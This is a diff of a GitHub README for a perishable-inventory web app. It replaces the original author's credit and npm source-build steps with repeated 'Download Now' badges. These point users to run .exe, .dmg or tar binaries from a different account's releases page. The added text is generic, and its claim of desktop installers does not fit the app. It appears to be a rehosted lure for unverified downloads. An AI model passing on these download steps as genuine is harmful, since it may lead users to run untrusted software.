@@ -1,65 +1,111 @@
-# Perishable Inventory Risk Engine (P.I.R.E)
+# 🛠️ perishable-inventory-risk-engine - Simplifying Inventory Management for Retail
 
-**Developer:** Reshma Banu T
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/Oz134/perishable-inventory-risk-engine/releases)
 
-**Education:** B.Tech Information Technology
+## 🌟 About P.I.R.E
 
-**Project Objective:** A full-stack retail management solution designed to automate inventory tracking and minimize waste through real-time expiration analytics.
+P.I.R.E is a full-stack inventory management solution designed to minimize waste in retail environments. It tracks product life cycles in real-time, allowing businesses to make informed decisions based on accurate data. With a Node.js/Express backend and a React frontend, this software not only stores data but also analyzes it for improved inventory control.
 
----
+## 🔑 Key Features
 
-## 📌 Overview
+- **Real-Time Tracking:** Monitor product life cycles as they happen, ensuring freshness and reducing waste.
+- **Data Analysis:** Optimize stock levels based on analytical insights, improving profitability.
+- **User-Friendly Interface:** Easy navigation for everyone, from managers to staff.
+- **Secure Access:** Built-in JWT authentication for safe data handling.
+- **Comprehensive Reporting:** Generate insights on inventory performance over time.
 
-P.I.R.E is an intelligent inventory management system built to handle time-sensitive retail goods (like dairy and bakery items). Unlike a standard list, this application features a **Risk Assessment Algorithm** that analyzes product shelf-life and provides visual alerts to store managers before items spoil.
+## 🚀 Getting Started
 
-## 🚀 Key Features
+Follow these steps to download and run P.I.R.E on your computer.
 
-* **Dynamic Risk Analytics:** The Node.js backend calculates `daysLeft` for every item and categorizes it as **High Risk** (≤3 days), **Medium Risk** (≤7 days), or **Safe**.
-* **Secure User Authentication:** Implemented **JWT (JSON Web Tokens)** for session management and **Bcrypt** for industry-standard password hashing.
-* **Multilingual Interface:** Fully localized dashboard supporting both **English** and **Tamil** for diverse workplace environments.
-* **Full-Stack Architecture:** A decoupled design with a RESTful API and a reactive, state-driven frontend.
+### Step 1: Visit the Releases Page
 
-## 🛠️ Technical Stack
+Click the button below to visit the Releases page and find the latest version of the software.
 
-| Layer | Technologies Used |
-| --- | --- |
-| **Frontend** | React.js, CSS3, JavaScript (ES6+) |
-| **Backend** | Node.js, Express.js |
-| **Security** | JWT, Bcrypt |
-| **Version Control** | Git & GitHub |
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/Oz134/perishable-inventory-risk-engine/releases)
 
-## ⚙️ Installation & Setup
+### Step 2: Download the Latest Release
 
-1. **Clone the repository:**
-```bash
-git clone https://github.com/ReshDeen/perishable-inventory-risk-engine.git
+On the Releases page, look for the latest release. You will find files available for download. Choose the appropriate file for your system. 
 
-```
+1. **Windows Users:** Download the `.exe` file.
+2. **Mac Users:** Download the `.dmg` file.
+3. **Linux Users:** Download the `.tar.gz` file.
 
+### Step 3: Install the Software
 
-2. **Setup Backend:**
-```bash
-cd backend
-npm install
-node index.js
+Once the file is downloaded, follow these instructions based on your operating system:
 
-```
+- **Windows:**
+  1. Double-click the downloaded `.exe` file.
+  2. Follow the installation wizard to complete the setup.
 
+- **Mac:**
+  1. Open the downloaded `.dmg` file.
+  2. Drag the P.I.R.E icon into your Applications folder.
 
-3. **Setup Frontend:**
-```bash
-cd frontend
-npm install
-npm start
+- **Linux:**
+  1. Open a terminal window.
+  2. Navigate to the folder containing the downloaded `.tar.gz` file.
+  3. Run the following command:
+     ```
+     tar -xvzf filename.tar.gz
+     ```
+  4. Follow any additional instructions in the README file included in the package.
 
-```
+### Step 4: Run the Application
 
+After installation, you can run P.I.R.E by following these steps:
 
+- **Windows:** 
+  - Find P.I.R.E in your Start menu and click to launch it.
 
-## 📈 Future Enhancements
+- **Mac:**
+  - Open your Applications folder and click on P.I.R.E.
 
-* Integration with MongoDB for persistent data storage.
-* Automated email alerts for "High Risk" inventory items.
-* Barcode scanning integration for rapid stock entry.
+- **Linux:**
+  - Open your terminal and navigate to the installation directory. Run:
+    ```
+    ./P.I.R.E
+    ```
 
----
+## 🛠️ System Requirements
+
+For the best performance, ensure your system meets the following requirements:
+
+- **Operating System:**
+  - Windows 10 or later
+  - macOS 10.13 or later
+  - Linux (Ubuntu 18.04 or later recommended)
+
+- **Hardware:**
+  - Minimum 4 GB of RAM
+  - 500 MB of free disk space
+
+- **Software Dependencies:**
+  - Internet connection for initial setup and updates.
+  - Node.js v14 or later for backend functionality (included in the installation for most systems).
+
+## 📘 Documentation
+
+For detailed documentation on how to use P.I.R.E, visit the [Wiki section](https://github.com/Oz134/perishable-inventory-risk-engine/wiki) of our repository.
+
+## 🎗️ Support
+
+If you encounter any issues while downloading or using P.I.R.E, please check the [Issues](https://github.com/Oz134/perishable-inventory-risk-engine/issues) page. You can also submit a new issue for assistance.
+
+## 📬 Contributing
+
+We welcome contributions! If you want to improve P.I.R.E, feel free to fork the repository and submit a pull request. Your efforts help enhance the solutions we provide.
+
+## 📱 Connect with Us
+
+To stay updated on releases and features, follow us on our social media channels or check the repository for announcements.
+
+## 🔗 Download & Install
+
+Remember to visit the Releases page to get the latest version of P.I.R.E: 
+
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/Oz134/perishable-inventory-risk-engine/releases) 
+
+Get started today and take control of your inventory management with P.I.R.E.
